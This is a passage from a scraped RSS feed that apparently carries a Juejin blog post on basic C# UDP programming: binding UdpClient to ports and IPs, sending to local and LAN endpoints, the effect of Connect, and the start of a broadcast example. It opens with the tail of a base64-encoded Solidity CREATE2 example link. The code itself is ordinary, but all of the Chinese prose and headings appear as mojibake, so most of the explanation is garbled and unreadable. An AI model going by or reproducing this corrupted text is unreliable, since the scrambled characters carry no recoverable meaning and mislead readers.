N0YXJ0cyBhZnRlciBza2lwcGluZyB0aGUgZmlyc3QgMzIgYnl0ZXMKICAgICAgICAgICAgICAgICAgICBhZGQoYnl0ZWNvZGUsIDB4MjApLAogICAgICAgICAgICAgICAgICAgIG1sb2FkKGJ5dGVjb2RlKSwgLy8gTG9hZCB0aGUgc2l6ZSBvZiBjb2RlIGNvbnRhaW5lZCBpbiB0aGUgZmlyc3QgMzIgYnl0ZXMKICAgICAgICAgICAgICAgICAgICBfc2FsdCAvLyBTYWx0IGZyb20gZnVuY3Rpb24gYXJndW1lbnRzCiAgICAgICAgICAgICAgICApCgogICAgICAgICAgICBpZiBpc3plcm8oZXh0Y29kZXNpemUoYWRkcikpIHsgcmV2ZXJ0KDAsIDApIH0KICAgICAgICB9CgogICAgICAgIGVtaXQgRGVwbG95ZWQoYWRkciwgX3NhbHQpOwogICAgfQp9Cgpjb250cmFjdCBUZXN0Q29udHJhY3QgewogICAgYWRkcmVzcyBwdWJsaWMgb3duZXI7CiAgICB1aW50MjU2IHB1YmxpYyBmb287CgogICAgY29uc3RydWN0b3IoYWRkcmVzcyBfb3duZXIsIHVpbnQyNTYgX2ZvbykgcGF5YWJsZSB7CiAgICAgICAgb3duZXIgPSBfb3duZXI7CiAgICAgICAgZm9vID0gX2ZvbzsKICAgIH0KCiAgICBmdW5jdGlvbiBnZXRCYWxhbmNlKCkgcHVibGljIHZpZXcgcmV0dXJucyAodWludDI1NikgewogICAgICAgIHJldHVybiBhZGRyZXNzKHRoaXMpLmJhbGFuY2U7CiAgICB9Cn0K" target="_blank" title="https://remix.byteatatime.dev/?#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCmNvbnRyYWN0IEZhY3RvcnkgewogICAgLy8gUmV0dXJucyB0aGUgYWRkcmVzcyBvZiB0aGUgbmV3bHkgZGVwbG95ZWQgY29udHJhY3QKICAgIGZ1bmN0aW9uIGRlcGxveShhZGRyZXNzIF9vd25lciwgdWludDI1NiBfZm9vLCBieXRlczMyIF9zYWx0KQogICAgICAgIHB1YmxpYwogICAgICAgIHBheWFibGUKICAgICAgICByZXR1cm5zIChhZGRyZXNzKQogICAgewogICAgICAgIC8vIFRoaXMgc3ludGF4IGlzIGEgbmV3ZXIgd2F5IHRvIGludm9rZSBjcmVhdGUyIHdpdGhvdXQgYXNzZW1ibHksIHlvdSBqdXN0IG5lZWQgdG8gcGFzcyBzYWx0CiAgICAgICAgLy8gaHR0cHM6Ly9kb2NzLnNvbGlkaXR5bGFuZy5vcmcvZW4vbGF0ZXN0L2NvbnRyb2wtc3RydWN0dXJlcy5odG1sI3NhbHRlZC1jb250cmFjdC1jcmVhdGlvbnMtY3JlYXRlMgogICAgICAgIHJldHVybiBhZGRyZXNzKG5ldyBUZXN0Q29udHJhY3R7c2FsdDogX3NhbHR9KF9vd25lciwgX2ZvbykpOwogICAgfQp9CgovLyBUaGlzIGlzIHRoZSBvbGRlciB3YXkgb2YgZG9pbmcgaXQgdXNpbmcgYXNzZW1ibHkKY29udHJhY3QgRmFjdG9yeUFzc2VtYmx5IHsKICAgIGV2ZW50IERlcGxveWVkKGFkZHJlc3MgYWRkciwgdWludDI1NiBzYWx0KTsKCiAgICAvLyAxLiBHZXQgYnl0ZWNvZGUgb2YgY29udHJhY3QgdG8gYmUgZGVwbG95ZWQKICAgIC8vIE5PVEU6IF9vd25lciBhbmQgX2ZvbyBhcmUgYXJndW1lbnRzIG9mIHRoZSBUZXN0Q29udHJhY3QncyBjb25zdHJ1Y3RvcgogICAgZnVuY3Rpb24gZ2V0Qnl0ZWNvZGUoYWRkcmVzcyBfb3duZXIsIHVpbnQyNTYgX2ZvbykKICAgICAgICBwdWJsaWMKICAgICAgICBwdXJlCiAgICAgICAgcmV0dXJucyAoYnl0ZXMgbWVtb3J5KQogICAgewogICAgICAgIGJ5dGVzIG1lbW9yeSBieXRlY29kZSA9IHR5cGUoVGVzdENvbnRyYWN0KS5jcmVhdGlvbkNvZGU7CgogICAgICAgIHJldHVybiBhYmkuZW5jb2RlUGFja2VkKGJ5dGVjb2RlLCBhYmkuZW5jb2RlKF9vd25lciwgX2ZvbykpOwogICAgfQoKICAgIC8vIDIuIENvbXB1dGUgdGhlIGFkZHJlc3Mgb2YgdGhlIGNvbnRyYWN0IHRvIGJlIGRlcGxveWVkCiAgICAvLyBOT1RFOiBfc2FsdCBpcyBhIHJhbmRvbSBudW1iZXIgdXNlZCB0byBjcmVhdGUgYW4gYWRkcmVzcwogICAgZnVuY3Rpb24gZ2V0QWRkcmVzcyhieXRlcyBtZW1vcnkgYnl0ZWNvZGUsIHVpbnQyNTYgX3NhbHQpCiAgICAgICAgcHVibGljCiAgICAgICAgdmlldwogICAgICAgIHJldHVybnMgKGFkZHJlc3MpCiAgICB7CiAgICAgICAgYnl0ZXMzMiBoYXNoID0ga2VjY2FrMjU2KAogICAgICAgICAgICBhYmkuZW5jb2RlUGFja2VkKAogICAgICAgICAgICAgICAgYnl0ZXMxKDB4ZmYpLCBhZGRyZXNzKHRoaXMpLCBfc2FsdCwga2VjY2FrMjU2KGJ5dGVjb2RlKQogICAgICAgICAgICApCiAgICAgICAgKTsKCiAgICAgICAgLy8gTk9URTogY2FzdCBsYXN0IDIwIGJ5dGVzIG9mIGhhc2ggdG8gYWRkcmVzcwogICAgICAgIHJldHVybiBhZGRyZXNzKHVpbnQxNjAodWludDI1NihoYXNoKSkpOwogICAgfQoKICAgIC8vIDMuIERlcGxveSB0aGUgY29udHJhY3QKICAgIC8vIE5PVEU6CiAgICAvLyBDaGVjayB0aGUgZXZlbnQgbG9nIERlcGxveWVkIHdoaWNoIGNvbnRhaW5zIHRoZSBhZGRyZXNzIG9mIHRoZSBkZXBsb3llZCBUZXN0Q29udHJhY3QuCiAgICAvLyBUaGUgYWRkcmVzcyBpbiB0aGUgbG9nIHNob3VsZCBlcXVhbCB0aGUgYWRkcmVzcyBjb21wdXRlZCBmcm9tIGFib3ZlLgogICAgZnVuY3Rpb24gZGVwbG95KGJ5dGVzIG1lbW9yeSBieXRlY29kZSwgdWludDI1NiBfc2FsdCkgcHVibGljIHBheWFibGUgewogICAgICAgIGFkZHJlc3MgYWRkcjsKCiAgICAgICAgLyoKICAgICAgICBOT1RFOiBIb3cgdG8gY2FsbCBjcmVhdGUyCgogICAgICAgIGNyZWF0ZTIodiwgcCwgbiwgcykKICAgICAgICBjcmVhdGUgbmV3IGNvbnRyYWN0IHdpdGggY29kZSBhdCBtZW1vcnkgcCB0byBwICsgbgogICAgICAgIGFuZCBzZW5kIHYgd2VpCiAgICAgICAgYW5kIHJldHVybiB0aGUgbmV3IGFkZHJlc3MKICAgICAgICB3aGVyZSBuZXcgYWRkcmVzcyA9IGZpcnN0IDIwIGJ5dGVzIG9mIGtlY2NhazI1NigweGZmICsgYWRkcmVzcyh0aGlzKSArIHMgKyBrZWNjYWsyNTYobWVtW3DigKYocCtuKSkpCiAgICAgICAgICAgICAgcyA9IGJpZy1lbmRpYW4gMjU2LWJpdCB2YWx1ZQogICAgICAgICovCiAgICAgICAgYXNzZW1ibHkgewogICAgICAgICAgICBhZGRyIDo9CiAgICAgICAgICAgICAgICBjcmVhdGUyKAogICAgICAgICAgICAgICAgICAgIGNhbGx2YWx1ZSgpLCAvLyB3ZWkgc2VudCB3aXRoIGN1cnJlbnQgY2FsbAogICAgICAgICAgICAgICAgICAgIC8vIEFjdHVhbCBjb2RlIHN0YXJ0cyBhZnRlciBza2lwcGluZyB0aGUgZmlyc3QgMzIgYnl0ZXMKICAgICAgICAgICAgICAgICAgICBhZGQoYnl0ZWNvZGUsIDB4MjApLAogICAgICAgICAgICAgICAgICAgIG1sb2FkKGJ5dGVjb2RlKSwgLy8gTG9hZCB0aGUgc2l6ZSBvZiBjb2RlIGNvbnRhaW5lZCBpbiB0aGUgZmlyc3QgMzIgYnl0ZXMKICAgICAgICAgICAgICAgICAgICBfc2FsdCAvLyBTYWx0IGZyb20gZnVuY3Rpb24gYXJndW1lbnRzCiAgICAgICAgICAgICAgICApCgogICAgICAgICAgICBpZiBpc3plcm8oZXh0Y29kZXNpemUoYWRkcikpIHsgcmV2ZXJ0KDAsIDApIH0KICAgICAgICB9CgogICAgICAgIGVtaXQgRGVwbG95ZWQoYWRkciwgX3NhbHQpOwogICAgfQp9Cgpjb250cmFjdCBUZXN0Q29udHJhY3QgewogICAgYWRkcmVzcyBwdWJsaWMgb3duZXI7CiAgICB1aW50MjU2IHB1YmxpYyBmb287CgogICAgY29uc3RydWN0b3IoYWRkcmVzcyBfb3duZXIsIHVpbnQyNTYgX2ZvbykgcGF5YWJsZSB7CiAgICAgICAgb3duZXIgPSBfb3duZXI7CiAgICAgICAgZm9vID0gX2ZvbzsKICAgIH0KCiAgICBmdW5jdGlvbiBnZXRCYWxhbmNlKCkgcHVibGljIHZpZXcgcmV0dXJucyAodWludDI1NikgewogICAgICAgIHJldHVybiBhZGRyZXNzKHRoaXMpLmJhbGFuY2U7CiAgICB9Cn0K" ref="nofollow noopener noreferrer">Create2.solCreate2.sol</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C# UDP åŸºæœ¬ä½¿ç”¨]]></title>    <link>https://juejin.cn/post/7590558945509392403</link>    <guid>https://juejin.cn/post/7590558945509392403</guid>    <pubDate>2026-01-02T01:03:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590558945509392403" data-draft-id="7589839433321660479" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C#  UDP åŸºæœ¬ä½¿ç”¨"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-02T01:03:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="çœŸæ˜¯ä»–"/> <meta itemprop="url" content="https://juejin.cn/user/3754177456770160"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C#  UDP åŸºæœ¬ä½¿ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3754177456770160/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    çœŸæ˜¯ä»–
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T01:03:08.000Z" title="Fri Jan 02 2026 01:03:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>UDPåŸºæœ¬ä»‹ç»ï¼š</p>
<p>UDP æ˜¯ä¸€ç§æ— è¿æ¥åè®®ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ä¸éœ€è¦å»ºç«‹è¿æ¥å³å¯å‘é€æ•°æ®ã€‚å®ƒçš„æ ¸å¿ƒåŠŸèƒ½æ˜¯å¿«é€Ÿä¼ è¾“æ•°æ®åŒ…ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97e7af4711b5439d966555a63df59343~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55yf5piv5LuW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767920588&amp;x-signature=Gtm38RnxveuItnwYQhS4S29HGOY%3D" alt="" loading="lazy"/></p>
<p>æ›´å¤šç‰¹æ€§ï¼Œå‚è€ƒ</p>
<pre><code class="hljs language-arduino" lang="arduino">https:<span class="hljs-comment">//www.runoob.com/np/udp-protocol.html</span>
</code></pre>
<h2 data-id="heading-0">ä¸€ã€UDP ç‚¹å¯¹ç‚¹é€šè®¯ï¼š</h2>
<p>è™½ç„¶UDPæ˜¯æ— è¿æ¥çš„ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥æ‰‹åŠ¨ç»‘å®šæœ¬åœ°IPã€‚ï¼ˆåœ¨UdpClientæ„é€ é‡Œï¼Œæˆ–ä½¿ç”¨ï¼‰</p>
<p>ç»‘å®šåï¼Œudpå°†ä»¥æ­¤æœ¬åœ°IPåŠç«¯å£é€šè®¯ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"> Â  Â  Â  Â  Â  Â // ç»‘å®šæœ¬åœ°ç«¯å£
 Â  Â  Â  Â  Â  Â UdpClient <span class="hljs-attr">udpClientA</span> = new UdpClient(<span class="hljs-number">321</span>)<span class="hljs-comment">;</span>

 Â  Â  Â  Â  Â  Â //ç»‘å®šæœ¬åœ°IPç«¯ç‚¹
 Â  Â  Â  Â  Â  Â IPAddress <span class="hljs-attr">ip_127_0_0_5</span> = IPAddress.Parse(<span class="hljs-string">"127.0.0.5"</span>)<span class="hljs-comment">;</span>
 Â  Â  Â  Â  Â  Â IPEndPoint <span class="hljs-attr">iPEndPoint_B</span> = new IPEndPoint(ip_<span class="hljs-number">127_0_0_5</span>, <span class="hljs-number">321</span>)<span class="hljs-comment">;</span>
 Â  Â  Â  Â  Â  Â UdpClient <span class="hljs-attr">udpClientB</span> = new UdpClient(iPEndPoint_B)<span class="hljs-comment">;</span>

 Â  Â  Â  Â  Â  Â //ä¸ç»‘å®šç«¯å£
 Â  Â  Â  Â  Â  Â UdpClient <span class="hljs-attr">udpClientC</span> = new UdpClient()<span class="hljs-comment">;</span>
</code></pre>
<p>AæŒ‡å®šäº†ç«¯å£321ï¼ŒBæŒ‡å®šäº†IPåŠç«¯å£ 127.0.0.5ï¼š321ï¼ŒCä¸æŒ‡å®šï¼›</p>
<p>ç„¶åé€šè¿‡UdpClient.Sendæ–¹æ³•è¿›è¡Œæ¶ˆæ¯å‘é€ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"> Â Byte<span class="hljs-section">[]</span> <span class="hljs-attr">sendBytes_A_P2P</span> = Encoding.ASCII.GetBytes(<span class="hljs-string">"A say Hi?"</span>)<span class="hljs-comment">;</span>
 Â Byte<span class="hljs-section">[]</span> <span class="hljs-attr">sendBytes_B_P2P</span> = Encoding.ASCII.GetBytes(<span class="hljs-string">"B say Hi?"</span>)<span class="hljs-comment">;</span>
 Â Byte<span class="hljs-section">[]</span> <span class="hljs-attr">sendBytes_C_P2P</span> = Encoding.ASCII.GetBytes(<span class="hljs-string">"C say Hi?"</span>)<span class="hljs-comment">;</span>

 Â IPEndPoint <span class="hljs-attr">remoteIPEndP_IP3</span> = new IPEndPoint(IPAddress.Parse(<span class="hljs-string">"127.0.0.1"</span>), <span class="hljs-number">555</span>)<span class="hljs-comment">;</span>
 Â IPEndPoint <span class="hljs-attr">remoteIPEndIP_IP1</span> = new IPEndPoint(
 Â  Â  Â IPAddress.Parse("192.168.153.1"),
 Â  Â  Â 666
 Â )<span class="hljs-comment">;</span>
 Â <span class="hljs-comment">#region P2På‘é€</span>
 Â Console.WriteLine("ç‚¹å¯¹ç‚¹æ”¶å‘")<span class="hljs-comment">;</span>
 Â try
 Â {
 Â  Â  Â udpClientA.Send(sendBytes_A_P2P)<span class="hljs-comment">;</span>
 Â }
 Â catch (Exception e)
 Â {
 Â  Â  Â Console.WriteLine(e.Message)<span class="hljs-comment">;</span>
 Â  Â  Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â }

 Â udpClientA.Send(sendBytes_A_P2P, remoteIPEndP_IP3)<span class="hljs-comment">;</span>
 Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â Console.WriteLine("A say Hi to 127.0.0.1:555")<span class="hljs-comment">;</span>
 Â udpClientA.Send(sendBytes_A_P2P, remoteIPEndIP_IP1)<span class="hljs-comment">;</span>
 Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â Console.WriteLine("A say Hi to 192.168.153.1:666")<span class="hljs-comment">;</span>

 Â udpClientB.Send(sendBytes_B_P2P, remoteIPEndP_IP3)<span class="hljs-comment">;</span>
 Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â Console.WriteLine("B say Hi to 127.0.0.1:555")<span class="hljs-comment">;</span>
 Â try
 Â {
 Â  Â  Â udpClientB.Send(sendBytes_B_P2P, remoteIPEndIP_IP1)<span class="hljs-comment">;</span>
 Â  Â  Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â  Â  Â Console.WriteLine("B say Hi to 192.168.153.1:666")<span class="hljs-comment">;</span>
 Â }
 Â catch (Exception e)
 Â {
 Â  Â  Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â  Â  Â Console.WriteLine($"{e.Message},IPEndPoint:{remoteIPEndIP_IP1}")<span class="hljs-comment">;</span>
 Â }

 Â udpClientC.Send(sendBytes_C_P2P, remoteIPEndP_IP3)<span class="hljs-comment">;</span>
 Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â Console.WriteLine("C say Hi to 127.0.0.1:555")<span class="hljs-comment">;</span>
 Â udpClientC.Send(sendBytes_C_P2P, remoteIPEndIP_IP1)<span class="hljs-comment">;</span>
 Â Console.WriteLine()<span class="hljs-comment">;</span>
 Â Console.WriteLine("C say Hi to 192.168.153.1:666")<span class="hljs-comment">;</span>


 Â <span class="hljs-comment">#endregion</span>
</code></pre>
<p>å…¶ä¸­UdpClient.Sendæ–¹æ³•æœ‰å¤šä¸ªé‡è½½ï¼Œ</p>
<p>å½“ä½¿ç”¨äº†UdpClient.Connect æ–¹æ³•</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/154d895baab3400da3aed0ffd87f97ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55yf5piv5LuW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767920588&amp;x-signature=4Aun422hE3oV4MsxvZvNxSdPkt0%3D" alt="" loading="lazy"/></p>
<p>å»ºç«‹è¿œç¨‹è¿æ¥åï¼Œå¯ä»¥ä¸å¸¦IPEndPointå‚æ•°ï¼Œ</p>
<p>å¦‚</p>
<pre><code class="hljs language-ini" lang="ini">udpClientA.Send(sendBytes_A_P2P)<span class="hljs-comment">;</span>
</code></pre>
<p>ä½†è¦æ˜¯æ²¡æœ‰ä½¿ç”¨Connectå°±è°ƒç”¨æ­¤å‡½æ•°å°±ä¼šå‡ºç°å¼‚å¸¸ï¼š</p>
<p>The operation is not allowed on non-connected sockets.</p>
<h2 data-id="heading-1">æ³¨æ„ï¼š</h2>
<p>1ã€ä½¿ç”¨UdpClient.Connect æ–¹æ³•</p>
<p>å»ºç«‹è¿æ¥åï¼Œå°±åªèƒ½æ¥å—æ­¤è¿œç¨‹IPèŠ‚ç‚¹çš„ä¿¡æ¯ã€‚è€Œä¸”è¿˜ä¸å¯ä»¥åœ¨Sendæ—¶å€™å†æŒ‡å®šè¿œç¨‹èŠ‚ç‚¹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2976bdda2ac948a4a6582cdd99ce26dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55yf5piv5LuW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767920588&amp;x-signature=UniSJfumpChFbT8EwQajokQytFc%3D" alt="" loading="lazy"/></p>
<p>2ã€åœ¨æ„é€ å‡½æ•°é‡ŒæŒ‡å®šç»‘å®šæœ¬åœ°IPåï¼Œå°±åªèƒ½åœ¨æ­¤æœ¬åœ°IPç½‘æ®µé€šè®¯ï¼ŒUDPClinetä¸ä¼šå†æ ¹æ®è¿œç¨‹èŠ‚ç‚¹åˆ‡æ¢IPã€‚</p>
<p>å¦‚ä¸Šè¿°ä¸­çš„Bï¼Œç»‘å®šæœ¬åœ°127.0.0.5ï¼Œæ­¤æ—¶å‘å…¶ä»–ç½‘æ®µé€šè®¯ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino"> Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-keyword">try</span>
 Â  Â  Â  Â  Â  Â  Â  Â {
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â udpClientB.<span class="hljs-built_in">Send</span>(sendBytes_B_P2P, remoteIPEndIP_IP1);
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-built_in">Console</span>.<span class="hljs-built_in">WriteLine</span>();
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-built_in">Console</span>.<span class="hljs-built_in">WriteLine</span>(<span class="hljs-string">"B say Hi to 192.168.153.1:666"</span>);
 Â  Â  Â  Â  Â  Â  Â  Â }
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-built_in">catch</span> (Exception e)
 Â  Â  Â  Â  Â  Â  Â  Â {
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-built_in">Console</span>.<span class="hljs-built_in">WriteLine</span>();
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-built_in">Console</span>.<span class="hljs-built_in">WriteLine</span>($<span class="hljs-string">"{e.Message},IPEndPoint:{remoteIPEndIP_IP1}"</span>);
 Â  Â  Â  Â  Â  Â  Â  Â }
</code></pre>
<p>å‡ºç°å¼‚å¸¸ï¼Œå‘ä¸€ä¸ªæ— æ³•è¿æ¥çš„ç½‘ç»œå°è¯•äº†ä¸€ä¸ªå¥—æ¥å­—æ“ä½œã€‚,IPEndPoint:192.168.153.1:666ã€‚</p>
<p>Â  é€šè®¯ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bb2f95a27464c43896a7838e7fe854f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55yf5piv5LuW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767920588&amp;x-signature=8A2f1nXXhmpUfXObzlcM%2FEcmj4U%3D" alt="" loading="lazy"/></p>
<p>Aå› ä¸ºç»‘å®šäº†ç«¯å£ï¼Œæ‰€ä»¥å‘é€çš„æ—¶å€™ä¼šä½¿ç”¨å›ºå®šç«¯å£321 ã€‚ Bç»‘å®šäº†ç«¯å£åŠIPï¼Œæ— æ³•ä¸å…¶ä»–ç½‘æ®µé€šè®¯ã€‚Cç”±äºæ²¡æœ‰æ‰‹åŠ¨æŒ‡å®šï¼Œä¼šç”±åŸºç¡€æœåŠ¡æä¾›åˆé€‚çš„IPåŠç«¯å£ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/580e3a7ac8eb449b8193985e83c57e13~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55yf5piv5LuW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767920588&amp;x-signature=if5JTzS1kT8BJuT5wdWJf%2BynXTQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">äºŒã€UDPå¹¿æ’­ï¼š</h2>
<p>Â  å°†ä¸»æœºå·ï¼Œè®¾ç½®æˆ255ï¼Œå°±æ˜¯æ­¤ç½‘æ®µçš„å¹¿æ’­åœ°å€ã€‚å…¨ç½‘æ®µå¹¿æ’­åœ°å€ä¸º255.255.255.255.</p>
<p>å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"> Â  Â //æ­¤ç½‘æ®µæ‰€æœ‰IP
 Â  Â IPEndPoint <span class="hljs-attr">allIPEndPoint_IP1</span> = new IPEndPoint(
 Â  Â  Â  Â IPAddress.Parse("192.168.153.255"),
 Â  Â  Â  Â 666
 Â  Â )<span class="hljs-comment">;</span>

